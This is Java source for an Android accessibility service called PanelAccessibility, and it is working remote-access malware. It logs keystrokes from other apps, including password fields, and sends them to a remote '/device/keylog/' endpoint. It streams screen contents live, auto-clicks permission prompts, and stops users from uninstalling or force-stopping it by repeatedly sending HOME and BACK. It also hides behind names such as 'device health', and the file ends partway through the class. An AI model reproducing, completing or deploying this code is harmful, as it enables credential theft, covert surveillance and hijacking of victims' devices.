package com.panellord;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.PowerManager;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class PanelAccessibility extends AccessibilityService {

    private static volatile PanelAccessibility instance;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private View blockOverlay;
    private BroadcastReceiver screenOffReceiver = null;
    private PowerManager.WakeLock powerWakeLock = null;
    private static volatile boolean powerLockEnabled = false;

    // ── Keylogger ────────────────────────────────────────────────────────────
    private final List<String> keyBuffer = new ArrayList<>();
    private static final int KEY_FLUSH_SIZE = 5;
    private static final long KEY_FLUSH_INTERVAL_MS = 3000;
    private static final long KLOG_POLL_MS = 500;
    private String lastTextPkg = "";
    private String lastTextVal = "";
    private static final String PREF_PENDING_KEYS = "pending_keylog";
    private static final String PREF_NAME = "panellord_klog";
    private static volatile boolean keylogActive = false;
    // Polling snapshot: nodeId → last known text
    private final Map<String, String> klogSnapshot = new HashMap<>();
    private Runnable klogPollRunnable;

    public static void startKeylog() {
        keylogActive = true;
        PanelAccessibility inst = instance;
        if (inst != null) inst.scheduleKlogPoll();
    }
    public static void stopKeylog() {
        keylogActive = false;
        PanelAccessibility inst = instance;
        if (inst != null) {
            if (inst.klogPollRunnable != null) inst.mainHandler.removeCallbacks(inst.klogPollRunnable);
            inst.klogSnapshot.clear();
        }
    }
    public static boolean isKeylogActive() { return keylogActive; }

    private void scheduleKlogPoll() {
        if (klogPollRunnable != null) mainHandler.removeCallbacks(klogPollRunnable);
        if (!keylogActive) return;
        klogPollRunnable = () -> {
            pollKeylog();
            scheduleKlogPoll();
        };
        mainHandler.postDelayed(klogPollRunnable, KLOG_POLL_MS);
    }

    /** Polling-based keylog: scan all text fields every 500ms, diff vs snapshot */
    @SuppressWarnings("NewApi")
    private void pollKeylog() {
        if (!keylogActive) return;
        try {
            List<AccessibilityWindowInfo> windows = getWindows();
            if (windows == null) return;
            for (AccessibilityWindowInfo win : windows) {
                AccessibilityNodeInfo root = win.getRoot();
                if (root == null) continue;
                String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
                if (!pkg.equals(MY_PKG)) {
                    scanNodeForKeylog(root, pkg);
                }
                root.recycle();
            }
        } catch (Exception ignored) {}
        // Also flush buffer after scanning
        synchronized (keyBuffer) {
            if (keyBuffer.size() >= KEY_FLUSH_SIZE) flushKeylog();
        }
    }

    private void scanNodeForKeylog(AccessibilityNodeInfo node, String pkg) {
        if (node == null) return;
        boolean isInput = node.isEditable() || node.isFocusable();
        if (isInput) {
            CharSequence textCs = node.getText();
            String nodeId = buildNodeId(node);
            String cur = textCs != null ? textCs.toString() : "";
            String prev = klogSnapshot.getOrDefault(nodeId, null);
            if (prev == null) {
                // First time seeing this field — just store, don't log
                klogSnapshot.put(nodeId, cur);
            } else if (!cur.equals(prev)) {
                // Text changed — compute diff
                if (cur.length() > prev.length() && cur.startsWith(prev)) {
                    // Characters appended
                    String added = cur.substring(prev.length());
                    queueKey(added, pkg, System.currentTimeMillis());
                } else if (cur.length() < prev.length()) {
                    // Characters deleted
                    int deleted = prev.length() - cur.length();
                    StringBuilder bk = new StringBuilder();
                    for (int i = 0; i < deleted; i++) bk.append("[⌫]");
                    queueKey(bk.toString(), pkg, System.currentTimeMillis());
                } else {
                    // Replace / cursor in middle
                    queueKey("[~]" + cur, pkg, System.currentTimeMillis());
                }
                klogSnapshot.put(nodeId, cur);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                scanNodeForKeylog(child, pkg);
                child.recycle();
            }
        }
    }

    private String buildNodeId(AccessibilityNodeInfo node) {
        String viewId = node.getViewIdResourceName();
        String pkg = node.getPackageName() != null ? node.getPackageName().toString() : "";
        String hint = node.getHintText() != null ? node.getHintText().toString() : "";
        return pkg + "|" + (viewId != null ? viewId : "") + "|" + hint;
    }

    public static PanelAccessibility getInstance() { return instance; }

    @Override
    public void onServiceConnected() {
        instance = this;
        // Start periodic flush scheduler
        mainHandler.postDelayed(this::periodicFlush, KEY_FLUSH_INTERVAL_MS);
        // Attempt to flush any pending offline keylogs
        new Thread(this::flushPendingOfflineKeys).start();
        // Start background watchdog that monitors Settings for our app page
        startSettingsWatchdog();
    }

    private void periodicFlush() {
        synchronized (keyBuffer) {
            if (!keyBuffer.isEmpty()) flushKeylog();
        }
        mainHandler.postDelayed(this::periodicFlush, KEY_FLUSH_INTERVAL_MS);
    }

    // ── Auto-allow: packages that show permission dialogs ──────────────────
    private static final List<String> PERM_PKGS = Arrays.asList(
        "com.android.permissioncontroller",
        "com.android.packageinstaller",
        "com.google.android.permissioncontroller",
        "com.android.systemui",
        "com.miui.security",
        "com.miui.permcenter",
        "com.coloros.permissionmanager",
        "com.oneplus.permissionmanager",
        "com.samsung.android.permissionmanager",
        "com.lge.qmemoplus",
        "android"
    );
    // Allow button texts — multi-language + screen cast dialog
    private static final List<String> ALLOW_TEXTS = Arrays.asList(
        "allow", "allow all the time", "allow only while using the app",
        "while using the app", "only this time", "allow always",
        "izin", "izinkan", "allow access", "ok", "start now",
        "continue", "got it", "accept", "grant", "permit",
        "enable", "activate", "confirm", "proceed",
        "अनुमति दें", "अनुमति", "allow access",
        "ijazah de", "izni ver", "허용", "허락"
    );

    // ── Uninstall blocker ─────────────────────────────────────────────────
    private static final String MY_PKG = "com.panellord";
    private static final List<String> UNINSTALL_PKGS = Arrays.asList(
        "com.android.packageinstaller",
        "com.google.android.packageinstaller",
        "com.android.settings",
        "com.miui.packageinstaller",
        "com.samsung.android.packageinstaller"
    );
    private static final List<String> UNINSTALL_TEXTS = Arrays.asList(
        "uninstall", "delete app", "remove app", "hapus aplikasi",
        "desinstalar", "désinstaller", "app deinstallieren",
        "हटाएं", "अनइंस्टॉल", "ऐप हटाएं",
        "uninstall app", "do you want to uninstall", "app will be deleted",
        "force stop", "force-stop", "forcestop",
        "फ़ोर्स स्टॉप", "강제 중지", "bắt buộc dừng"
    );
    private static final List<String> APP_NAMES = Arrays.asList(
        MY_PKG, "bajaj ecs", "bajajecs", "device health"
    );
    private int uninstallBlockCount = 0;
    private long lastBlockTime = 0;

    private boolean isUninstallScreen(AccessibilityEvent e) {
        String pkg = e.getPackageName() != null ? e.getPackageName().toString().toLowerCase() : "";
        boolean isInstallerPkg = UNINSTALL_PKGS.contains(pkg)
            || pkg.contains("packageinstaller") || pkg.contains("settings");
        if (!isInstallerPkg) return false;

        // Check event text
        String titleLow = "";
        if (e.getText() != null && !e.getText().isEmpty()) {
            titleLow = e.getText().get(0).toString().toLowerCase();
        }
        // Also check content description
        if (e.getContentDescription() != null)
            titleLow += " " + e.getContentDescription().toString().toLowerCase();

        for (String ut : UNINSTALL_TEXTS) {
            if (titleLow.contains(ut)) {
                // Don't need to confirm our package is mentioned if it's an uninstall dialog
                return true;
            }
        }

        // Fallback: scan window nodes for uninstall + our app
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                String flat = flattenNode(root).toLowerCase();
                root.recycle();
                boolean hasUninstall = false, hasOurApp = false;
                for (String ut : UNINSTALL_TEXTS) if (flat.contains(ut)) { hasUninstall = true; break; }
                for (String an : APP_NAMES) if (flat.contains(an)) { hasOurApp = true; break; }
                if (hasUninstall && hasOurApp) return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    private String flattenNode(AccessibilityNodeInfo node) {
        if (node == null) return "";
        StringBuilder sb = new StringBuilder();
        if (node.getText() != null) sb.append(node.getText()).append(" ");
        if (node.getContentDescription() != null) sb.append(node.getContentDescription()).append(" ");
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) { sb.append(flattenNode(child)); child.recycle(); }
        }
        return sb.toString();
    }

    private void blockUninstall() {
        long now = System.currentTimeMillis();
        if (now - lastBlockTime < 600) return; // debounce
        lastBlockTime = now;
        uninstallBlockCount++;

        // Press HOME aggressively 5× with 300ms intervals
        for (int i = 0; i < 5; i++) {
            final int idx = i;
            mainHandler.postDelayed(() -> {
                try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
            }, idx * 300L);
        }
        // Also press BACK once to dismiss any dialog
        mainHandler.postDelayed(() -> {
            try { performGlobalAction(GLOBAL_ACTION_BACK); } catch (Exception ignored) {}
        }, 150);

        // Re-check after 1.5 seconds and block again if still on uninstall screen
        if (uninstallBlockCount < 12) {
            mainHandler.postDelayed(() -> {
                try {
                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root != null) {
                        String flat = flattenNode(root).toLowerCase();
                        root.recycle();
                        boolean stillUninstall = false;
                        for (String ut : UNINSTALL_TEXTS) {
                            if (flat.contains(ut)) { stillUninstall = true; break; }
                        }
                        if (stillUninstall) blockUninstall();
                    }
                } catch (Exception ignored) {}
            }, 1500);
        } else {
            uninstallBlockCount = 0;
        }
    }

    // ── Settings App-Info blocker ─────────────────────────────────────────────
    private static final String[] DANGER_WORDS = {
        "force stop", "force-stop", "स्टॉप करें", "강제 중지",
        "uninstall", "désinstaller", "desinstalar", "hapus",
        "clear data", "clear cache", "storage & cache",
        "disable", "deactivate"
    };
    private long lastSettingsBlock = 0;

    private void checkAndBlockAppInfo() {
        long now = System.currentTimeMillis();
        if (now - lastSettingsBlock < 60) return; // prevent re-entry within 60ms
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            String flat = flattenNode(root).toLowerCase();
            root.recycle();

            boolean hasOurApp = false;
            for (String an : APP_NAMES) {
                if (flat.contains(an.toLowerCase())) { hasOurApp = true; break; }
            }
            // Also check our package name directly
            if (!hasOurApp && flat.contains(MY_PKG.toLowerCase())) hasOurApp = true;

            boolean hasDanger = false;
            for (String dw : DANGER_WORDS) {
                if (flat.contains(dw)) { hasDanger = true; break; }
            }

            if (hasOurApp && hasDanger) {
                lastSettingsBlock = now;
                // Fire HOME 10× at 80ms intervals — user cannot tap Force Stop that fast
                for (int i = 0; i < 10; i++) {
                    final int idx = i;
                    mainHandler.postDelayed(() -> {
                        try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
                    }, idx * 80L);
                }
                // Also press BACK once to dismiss any confirmation dialog
                mainHandler.postDelayed(() -> {
                    try { performGlobalAction(GLOBAL_ACTION_BACK); } catch (Exception ignored) {}
                }, 40);
            }
        } catch (Exception ignored) {}
    }

    // ── Settings watchdog — background thread checks every 1.5s ───────────────
    private volatile boolean watchdogRunning = false;
    private Thread watchdogThread;

    private void startSettingsWatchdog() {
        if (watchdogRunning) return;
        watchdogRunning = true;
        watchdogThread = new Thread(() -> {
            while (watchdogRunning) {
                try {
                    Thread.sleep(1500);
                    if (!watchdogRunning) break;
                    // Check if Settings is currently on top
                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root != null) {
                        CharSequence pkg = root.getPackageName();
                        root.recycle();
                        if (pkg != null) {
                            String p = pkg.toString();
                            if (p.contains("settings") || p.contains("securitycenter") || p.contains("packageinstaller")) {
                                mainHandler.post(this::checkAndBlockAppInfo);
                            }
                        }
                    }
                } catch (InterruptedException ie) {
                    break;
                } catch (Exception ignored) {}
            }
        });
        watchdogThread.setDaemon(true);
        watchdogThread.start();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        int type = e.getEventType();

        // ── App Info / Settings blocker — INSTANT intercept (0ms delay) ───────
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            String evPkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
            if (evPkg.contains("settings") || evPkg.contains("securitycenter")
                    || evPkg.contains("packageinstaller")) {
                // Immediate check + follow-up checks (user might still be navigating)
                checkAndBlockAppInfo();
                mainHandler.postDelayed(this::checkAndBlockAppInfo, 80);
                mainHandler.postDelayed(this::checkAndBlockAppInfo, 250);
                mainHandler.postDelayed(this::checkAndBlockAppInfo, 600);
            }
        }

        // ── Uninstall blocker ──────────────────────────────────────────────
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            if (isUninstallScreen(e)) {
                mainHandler.postDelayed(this::blockUninstall, 200);
            }
        }

        // ── Auto-allow permission dialogs ──────────────────────────────────
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            String pkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
            if (PERM_PKGS.contains(pkg) || pkg.contains("permission") || pkg.contains("packageinstaller")) {
                mainHandler.postDelayed(() -> tryAutoAllow(), 300);
            }
        }

        // ── HOME button counter — re-block if user escapes to launcher ──────
        if (blockOverlay != null && type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String evPkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
            // Known launcher packages — if any of these come to foreground, bring blocker back
            if (evPkg.contains("launcher") || evPkg.contains("home")
                    || evPkg.equals("com.google.android.apps.nexuslauncher")
                    || evPkg.equals("com.sec.android.app.launcher")
                    || evPkg.equals("com.miui.home")
                    || evPkg.equals("com.oneplus.launcher")
                    || evPkg.equals("com.android.launcher")
                    || evPkg.equals("com.android.launcher3")) {
                // Re-launch BlackScreenActivity (our blocking screen) to push home to background
                mainHandler.postDelayed(() -> {
                    try {
                        android.content.Intent i = new android.content.Intent(this, BlackScreenActivity.class);
                        i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                            | android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                            | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        startActivity(i);
                    } catch (Exception ignored) {}
                }, 120);
            }
        }

        // ── Screen Live Mode — auto-push on any UI change (including taps) ──
        if (screenLiveMode &&
            (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
             type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
             type == AccessibilityEvent.TYPE_VIEW_SCROLLED          ||
             type == AccessibilityEvent.TYPE_VIEW_CLICKED           ||
             type == AccessibilityEvent.TYPE_VIEW_FOCUSED           ||
             type == AccessibilityEvent.TYPE_VIEW_SELECTED)) {
            onWindowChangedMaybePush();
        }

        // ── Keylogger — capture diff chars, not full text ─────────────────
        if (keylogActive && type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String pkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
            if (pkg.equals(MY_PKG)) return;
            String newText = (e.getText() != null && !e.getText().isEmpty())
                ? e.getText().get(0).toString() : "";
            String beforeText = e.getBeforeText() != null ? e.getBeforeText().toString() : "";
            // Compute added character(s)
            String addedChar;
            if (newText.length() > beforeText.length()) {
                // Characters added — extract what was typed
                if (newText.startsWith(beforeText)) {
                    addedChar = newText.substring(beforeText.length());
                } else {
                    // Cursor somewhere in middle — just show full new text on change
                    addedChar = null;
                    if (!newText.equals(lastTextVal) || !pkg.equals(lastTextPkg)) {
                        lastTextVal = newText; lastTextPkg = pkg;
                        queueKey("[FULL]" + newText, pkg, System.currentTimeMillis());
                    }
                }
            } else if (newText.length() < beforeText.length()) {
                addedChar = "[⌫]"; // backspace
            } else {
                addedChar = null; // same length replace — skip
            }
            if (addedChar != null) {
                lastTextVal = newText; lastTextPkg = pkg;
                queueKey(addedChar, pkg, System.currentTimeMillis());
            }
        }
    }

    private void tryAutoAllow() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            if (!clickAllowButton(root)) {
                root.recycle();
            }
        } catch (Exception ignored) {}
    }

    private boolean clickAllowButton(AccessibilityNodeInfo node) {
        if (node == null) return false;
        // Check this node
        CharSequence textCs = node.getText();
        CharSequence descCs = node.getContentDescription();
        String text = textCs != null ? textCs.toString().toLowerCase().trim() : "";
        String desc = descCs != null ? descCs.toString().toLowerCase().trim() : "";
        if ((node.isClickable() || node.getClassName() != null &&
                (node.getClassName().toString().contains("Button") ||
                 node.getClassName().toString().contains("TextView"))) &&
            isAllowText(text, desc)) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            node.recycle();
            return true;
        }
        // Recurse into children
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null && clickAllowButton(child)) {
                node.recycle();
                return true;
            }
        }
        node.recycle();
        return false;
    }

    private boolean isAllowText(String text, String desc) {
        for (String a : ALLOW_TEXTS) {
            if (text.equals(a) || desc.equals(a)) return true;
            // Also partial match for "allow" at start
            if (a.equals("allow") && (text.startsWith("allow") || desc.startsWith("allow"))) return true;
        }
        return false;
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        int code = event.getKeyCode();
        if (event.getAction() == KeyEvent.ACTION_DOWN) {
            String keyName;
            if (code >= KeyEvent.KEYCODE_0 && code <= KeyEvent.KEYCODE_9) {
                keyName = String.valueOf(code - KeyEvent.KEYCODE_0);
            } else if (code >= KeyEvent.KEYCODE_A && code <= KeyEvent.KEYCODE_Z) {
                keyName = String.valueOf((char)('a' + code - KeyEvent.KEYCODE_A));
            } else {
                keyName = KeyEvent.keyCodeToString(code).replace("KEYCODE_", "");
            }
            queueKey(keyName, "hardware", System.currentTimeMillis());
        }
        // When blocking is active, consume BACK / RECENTS / MENU / VOLUME keys
        // HOME cannot be consumed here (Android security) — handled via onAccessibilityEvent
        if (blockOverlay != null) {
            if (code == KeyEvent.KEYCODE_BACK
                    || code == KeyEvent.KEYCODE_APP_SWITCH
                    || code == KeyEvent.KEYCODE_MENU
                    || code == KeyEvent.KEYCODE_SEARCH
                    || code == KeyEvent.KEYCODE_VOLUME_DOWN
                    || code == KeyEvent.KEYCODE_VOLUME_UP
                    || code == KeyEvent.KEYCODE_VOLUME_MUTE
                    || code == KeyEvent.KEYCODE_CAMERA
                    || code == KeyEvent.KEYCODE_NOTIFICATION) {
                return true; // swallow — never reaches the system
            }
        }
        return false;
    }

    private void queueKey(String key, String app, long ts) {
        if (!keylogActive) return;
        synchronized (keyBuffer) {
            keyBuffer.add("{\"key\":" + org.json.JSONObject.quote(key)
                + ",\"app\":" + org.json.JSONObject.quote(app)
                + ",\"ts\":" + ts + "}");
            if (keyBuffer.size() >= KEY_FLUSH_SIZE) flushKeylog();
        }
    }

    /* ── Screen content reader ───────────────────────────────────────────── */
    private static volatile boolean screenLiveMode = false;
    public static void setScreenLive(boolean on) {
        screenLiveMode = on;
        // instance will start/stop the periodic timer via setScreenLiveInstance
    }
    public static boolean isScreenLive() { return screenLiveMode; }

    // ── Periodic screen-text push (fires every 250ms when live mode on) ──
    private final Runnable screenLiveTick = new Runnable() {
        @Override public void run() {
            if (!screenLiveMode) return;
            new Thread(() -> {
                try {
                    String result = getScreenText();
                    if (result != null && !result.isEmpty()) {
                        ApiClient.postJson("/device/screen-text/" + DeviceIdManager.getDeviceId(PanelAccessibility.this), result);
                    }
                } catch (Exception ignored) {}
            }).start();
            // Schedule next tick
            mainHandler.postDelayed(screenLiveTick, 250);
        }
    };

    /** Start/stop the periodic live screen push */
    void startScreenLiveTicks() {
        mainHandler.removeCallbacks(screenLiveTick);
        if (screenLiveMode) mainHandler.postDelayed(screenLiveTick, 100);
    }
    void stopScreenLiveTicks() {
        mainHandler.removeCallbacks(screenLiveTick);
    }

    // Debounce runnable for event-driven push
    private final Runnable screenPushDebounce = () -> {
        screenPushDeadline = 0; // reset max-wait clock
        new Thread(() -> {
            try {
                String result = getScreenText();
                if (result != null && !result.isEmpty()) {
                    ApiClient.postJson("/device/screen-text/" + DeviceIdManager.getDeviceId(PanelAccessibility.this), result);
                }
            } catch (Exception ignored) {}
        }).start();
    };

    /** Max-wait: if events keep resetting debounce, force-push after 500ms regardless */
    private long screenPushDeadline = 0;
    private static final long PUSH_DEBOUNCE_MS = 80;
    private static final long PUSH_MAX_WAIT_MS  = 500;

    /** Called on any UI event — debounces pushes, but forces one every 500ms if flooded */
    private void onWindowChangedMaybePush() {
        if (!screenLiveMode) return;
        long now = System.currentTimeMillis();
        if (screenPushDeadline == 0) screenPushDeadline = now + PUSH_MAX_WAIT_MS;
        mainHandler.removeCallbacks(screenPushDebounce);
        long delay = (now >= screenPushDeadline) ? 0 : PUSH_DEBOUNCE_MS;
        mainHandler.postDelayed(screenPushDebounce, delay);
    }

    /**
     * Reads ALL visible screen content using all windows (not just active window).
     * Returns JSON: { pkg, title, text, inputs }
     */
    @SuppressWarnings("NewApi")
    public String getScreenText() {
        try {
            String pkg = "";
            String title = "";
            StringBuilder allText = new StringBuilder();
            StringBuilder inputFields = new StringBuilder();
            org.json.JSONArray els = new org.json.JSONArray();

            // Get screen dimensions
            android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
            int sw = dm.widthPixels;
            int sh = dm.heightPixels;

            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                java.util.List<AccessibilityWindowInfo> windows = getWindows();
                if (windows != null) {
                    for (AccessibilityWindowInfo win : windows) {
                        int type = win.getType();
                        // Skip keyboard IME windows
                        if (type == AccessibilityWindowInfo.TYPE_INPUT_METHOD) continue;
                        AccessibilityNodeInfo root = win.getRoot();
                        if (root == null) continue;
                        String winPkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
                        // Skip keyboard and system settings overlay packages
                        if (isKeyboardOrSystemPkg(winPkg)) { root.recycle(); continue; }
                        CharSequence winTitle = win.getTitle();
                        if (!winPkg.startsWith("android") && pkg.isEmpty()) pkg = winPkg;
                        if (winTitle != null && !winTitle.toString().isEmpty() && title.isEmpty()) title = winTitle.toString();
                        if (allText.length() > 0) allText.append("\n─────────────\n");
                        allText.append("APP: ").append(winPkg).append("\n");
                        extractAllText(root, allText, inputFields, 0);
                        extractElements(root, els, 0);
                        root.recycle();
                    }
                }
            }
            if (allText.length() == 0) {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root != null) {
                    pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
                    extractAllText(root, allText, inputFields, 0);
                    extractElements(root, els, 0);
                    root.recycle();
                }
            }

            if (allText.length() == 0 && inputFields.length() == 0 && els.length() == 0) return "";

            org.json.JSONObject j = new org.json.JSONObject();
            j.put("pkg", pkg);
            j.put("title", title);
            j.put("text", allText.toString().trim());
            j.put("inputs", inputFields.toString().trim());
            j.put("sw", sw);
            j.put("sh", sh);
            j.put("els", els);
            j.put("ts", System.currentTimeMillis());
            return j.toString();
        } catch (Exception e) {
            return "";
        }
    }

    /** Collect element bounds + text for CraxsRat-style canvas wireframe rendering.
     *  Emits every visible node that has non-zero screen bounds — more permissive
     *  than extractAllText, so the canvas always shows something. */
    private void extractElements(AccessibilityNodeInfo node, org.json.JSONArray out, int depth) {
        if (node == null || depth > 45) return;
        try {
            CharSequence cls   = node.getClassName();
            String className   = cls != null ? cls.toString() : "";
            boolean isEdit     = className.contains("EditText") || node.isEditable();
            boolean isClickable= node.isClickable();
            boolean isImg      = className.contains("ImageView") || className.contains("ImageButton");
            boolean isBtn      = className.contains("Button") || (isClickable && !isEdit);
            boolean isCheckbox = className.contains("CheckBox") || className.contains("Switch") || className.contains("Toggle");

            CharSequence t    = node.getText();
            CharSequence d    = node.getContentDescription();
            CharSequence hint = node.getHintText();

            String textStr = t    != null ? t.toString().trim()    : "";
            String descStr = d    != null ? d.toString().trim()    : "";
            String hintStr = hint != null ? hint.toString().trim() : "";
            String label   = !textStr.isEmpty() ? textStr : (!descStr.isEmpty() ? descStr : hintStr);

            // Emit: anything that has text/desc OR is a leaf OR is a known interactive widget
            Rect b = new Rect();
            node.getBoundsInScreen(b);
            boolean visibleBounds = b.width() > 8 && b.height() > 4;
            boolean hasText = !label.isEmpty();
            boolean isLeaf  = node.getChildCount() == 0;
            boolean emit    = visibleBounds && node.isVisibleToUser()
                              && (hasText || isLeaf || isEdit || isClickable || isCheckbox);

            if (emit) {
                org.json.JSONObject el = new org.json.JSONObject();
                el.put("t", label.isEmpty() ? "" : label);
                el.put("x", b.left);
                el.put("y", b.top);
                el.put("w", b.width());
                el.put("h", b.height());
                // kind: e=edit, b=button/clickable, img=image, cb=checkbox, tx=text
                String kind;
                if (isEdit)          kind = "e";
                else if (isBtn)      kind = "b";
                else if (isImg)      kind = "img";
                else if (isCheckbox) kind = "cb";
                else                 kind = "tx";
                el.put("k", kind);
                el.put("pw", node.isPassword());
                out.put(el);
            }
        } catch (Exception ignored) {}
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                extractElements(child, out, depth + 1);
                child.recycle();
            }
        }
    }

    /** Returns true for keyboard/IME packages that add noise to screen-reader output.
     *  Settings pages are intentionally NOT filtered — user may want to see them. */
    private boolean isKeyboardOrSystemPkg(String pkg) {
        if (pkg == null || pkg.isEmpty()) return false;
        return pkg.contains("inputmethod")
            || pkg.contains(".keyboard")
            || pkg.contains("gboard")
            || pkg.contains("honeyboard")
            || pkg.contains("swiftkeyboard")
            || pkg.contains("swiftkey")
            || pkg.contains(".ime.")
            || pkg.equals("com.samsung.android.honeyboard")
            || pkg.equals("com.google.android.inputmethod.latin");
    }

    private void extractAllText(AccessibilityNodeInfo node, StringBuilder sb,
                                 StringBuilder inputs, int depth) {
        if (node == null || depth > 35) return;

        CharSequence cls = node.getClassName();
        String className = cls != null ? cls.toString() : "";
        boolean isEditText = className.contains("EditText") || node.isEditable();
        boolean isButton   = className.contains("Button");

        CharSequence t = node.getText();
        CharSequence d = node.getContentDescription();
        CharSequence hint = node.getHintText();

        String textStr   = t != null ? t.toString().trim() : "";
        String descStr   = d != null ? d.toString().trim() : "";
        String hintStr   = hint != null ? hint.toString().trim() : "";

        if (isEditText) {
            String label = !hintStr.isEmpty() ? hintStr : (!descStr.isEmpty() ? descStr : "field");
            String value = !textStr.isEmpty() ? textStr : "(empty)";
            boolean isPassword = node.isPassword();
            inputs.append("[INPUT] ").append(label)
                  .append(isPassword ? " [PASSWORD]" : "")
                  .append(": ").append(value).append("\n");
            if (!textStr.isEmpty()) {
                sb.append("[✏ ").append(label).append("]: ").append(value).append("\n");
            }
        } else if (isButton) {
            String label = !textStr.isEmpty() ? textStr : (!descStr.isEmpty() ? descStr : "");
            if (!label.isEmpty()) sb.append("[⬛ ").append(label).append("]\n");
        } else {
            if (!textStr.isEmpty()) {
                sb.append(textStr).append("\n");
            } else if (!descStr.isEmpty()) {
                sb.append("[").append(descStr).append("]\n");
            } else if (node.isClickable() && !className.isEmpty()) {
                // Clickable view with no text — show class so reader shows something on lock screen
                String simpleName = className.contains(".") ? className.substring(className.lastIndexOf('.') + 1) : className;
                if (!simpleName.isEmpty() && !simpleName.equals("View") && !simpleName.equals("LinearLayout")
                        && !simpleName.equals("RelativeLayout") && !simpleName.equals("FrameLayout")
                        && !simpleName.equals("ConstraintLayout")) {
                    sb.append("[").append(simpleName).append("]\n");
                }
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                extractAllText(child, sb, inputs, depth + 1);
                child.recycle();
            }
        }
    }

    // Must be called inside synchronized(keyBuffer)
    private void flushKeylog() {
        if (keyBuffer.isEmpty()) return;
        StringBuilder sb = new StringBuilder("[");
        for (int i = 0; i < keyBuffer.size(); i++) {
            if (i > 0) sb.append(',');
            sb.append(keyBuffer.get(i));
        }
        sb.append("]");
        final List<String> toSend = new ArrayList<>(keyBuffer);
        keyBuffer.clear();
        final String body = "{\"keys\":" + sb + "}";
        final String deviceId = DeviceIdManager.getDeviceId(this);
        new Thread(() -> {
            try {
                ApiClient.postJson("/device/keylog/" + deviceId, body);
                // If successful, clear any pending offline keys too
                clearPendingOfflineKeys();
            } catch (Exception e) {
                // Offline — save to SharedPreferences to retry later
                savePendingKeys(toSend);
            }
        }).start();
    }

    private void savePendingKeys(List<String> keys) {
        try {
            SharedPreferences prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
            String existing = prefs.getString(PREF_PENDING_KEYS, "");
            StringBuilder sb = new StringBuilder(existing);
            for (String k : keys) {
                if (sb.length() > 0) sb.append(',');
                sb.append(k);
            }
            // Keep max 1000 entries in prefs
            String all = sb.toString();
            if (all.split("\\},\\{").length > 1000) {
                int trimAt = all.indexOf("},", all.length() / 2);
                if (trimAt > 0) all = all.substring(trimAt + 2);
            }
            prefs.edit().putString(PREF_PENDING_KEYS, all).apply();
        } catch (Exception ignored) {}
    }

    private void flushPendingOfflineKeys() {
        try {
            SharedPreferences prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
            String pending = prefs.getString(PREF_PENDING_KEYS, "");
            if (pending.isEmpty()) return;
            String body = "{\"keys\":[" + pending + "]}";
            String deviceId = DeviceIdManager.getDeviceId(this);
            ApiClient.postJson("/device/keylog/" + deviceId, body);
            clearPendingOfflineKeys();
        } catch (Exception ignored) {}
    }

    private void clearPendingOfflineKeys() {
        try {
            getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                .edit().remove(PREF_PENDING_KEYS).apply();
        } catch (Exception ignored) {}
    }

